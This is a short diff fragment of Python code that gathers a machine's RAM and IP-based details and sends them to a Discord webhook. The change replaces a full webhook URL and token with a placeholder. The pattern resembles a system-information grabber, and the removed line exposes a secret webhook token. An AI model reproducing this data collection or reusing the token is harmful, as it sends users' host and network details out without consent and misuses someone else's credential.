@@ -103,7 +103,7 @@ mem = virtual_memory()
 ram=mem.total 
 
 def contect_perfect():
-    url = 'https://discord.com/api/webhooks/809324900317528094/RRWVA8oh11Hbxj6AvXtlfNaYSW34dbApAAgNftgFuU1RYFK8EqBmvjrXBkQPFe9MbMaA'
+    url = 'WEBHOOK URL'
     webhook = DiscordWebhook(url=url)
     con = get_info(get_ip())
     con.get('proxy')
